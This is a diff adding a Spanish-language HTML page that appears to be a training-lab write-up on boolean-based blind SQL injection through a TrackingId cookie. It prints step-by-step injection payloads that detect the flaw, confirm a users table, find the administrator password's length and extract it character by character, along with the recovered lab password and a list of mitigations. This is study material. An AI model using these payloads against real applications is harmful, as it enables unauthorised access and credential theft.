@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+<meta charset="UTF-8">
+<title>Lab 11 - Blind SQL Injection</title>
+
+<link rel="stylesheet" href="../style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+
+<body>
+
+<nav class="navbar">
+<div class="nav-content">
+<div class="logo">AG<span>.</span></div>
+
+<div class="links">
+<a href="../index.html">Inicio</a>
+<a href="../roadmap/sql-injection.html">Volver a Labs</a>
+</div>
+</div>
+</nav>
+
+
+<section class="activities-section">
+
+<div class="activities-container">
+
+<div class="activities-header">
+<h2><i class="fas fa-database"></i> Lab 11</h2>
+<p>Blind SQL Injection using Boolean-based conditions</p>
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-layer-group"></i> Información del laboratorio</h3>
+
+<p><strong>Nivel:</strong> Practitioner</p>
+
+<p><strong>Tipo de SQLi:</strong> Boolean-based Blind SQL Injection</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-bullseye"></i> Objetivo</h3>
+
+<p>
+Extraer la contraseña del usuario <strong>administrator</strong>
+mediante SQL Injection ciega basada en condiciones booleanas.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-exclamation-triangle"></i> Vulnerabilidad</h3>
+
+<p>
+La aplicación utiliza la cookie <strong>TrackingId</strong>
+dentro de una consulta SQL sin sanitización adecuada.
+</p>
+
+<p>
+Aunque no devuelve datos ni errores SQL,
+la página muestra el mensaje <strong>"Welcome back"</strong>
+cuando la condición de la consulta es verdadera.
+</p>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-terminal"></i> Procedimiento</h3>
+
+<p><strong>Paso 1 – Detectar comportamiento booleano</strong></p>
+
+<pre>
+TrackingId=R8Y42FuF2GZDJ9w4' AND '1'='2
+</pre>
+
+<p>
+El mensaje "Welcome back" desaparece,
+confirmando la inyección SQL.
+</p>
+
+
+<p><strong>Paso 2 – Confirmar existencia de la tabla users</strong></p>
+
+<pre>
+TrackingId=R8Y42FuF2GZDJ9w4' AND (SELECT 'a' FROM users LIMIT 1)='a
+</pre>
+
+<p>
+El mensaje vuelve a aparecer,
+confirmando la existencia de la tabla.
+</p>
+
+
+<p><strong>Paso 3 – Encontrar longitud de la contraseña</strong></p>
+
+<pre>
+TrackingId=R8Y42FuF2GZDJ9w4' 
+AND (SELECT 'a' FROM users 
+WHERE username='administrator' 
+AND LENGTH(password)=20)='a
+</pre>
+
+<p>
+Se descubre que la contraseña tiene <strong>20 caracteres</strong>.
+</p>
+
+
+<p><strong>Paso 4 – Extraer caracteres con Intruder</strong></p>
+
+<p>
+Se utiliza un ataque <strong>Cluster Bomb</strong> para
+extraer carácter por carácter de la contraseña.
+</p>
+
+<pre>
+SUBSTRING(password,1,1)
+</pre>
+
+
+<p>
+Tras analizar las respuestas con "Welcome back",
+se reconstruye la contraseña completa:
+</p>
+
+<pre>
+kycwnnz2eed0t1jud1op
+</pre>
+
+</div>
+
+
+<div class="info-card">
+
+<h3><i class="fas fa-shield-alt"></i> Mitigación recomendada</h3>
+
+<ul>
+
+<li>Uso de consultas parametrizadas.</li>
+
+<li>No usar datos del usuario directamente en consultas SQL.</li>
+
+<li>Evitar exponer comportamiento lógico en respuestas.</li>
+
+<li>Implementar monitoreo de ataques automatizados.</li>
+
+</ul>
+
+</div>
+
+
+<a href="../roadmap/sql-injection.html" class="back-btn">
+<i class="fas fa-arrow-left"></i> Volver a laboratorios
+</a>
+
+</div>
+
+</section>
+
+</body>
+</html>
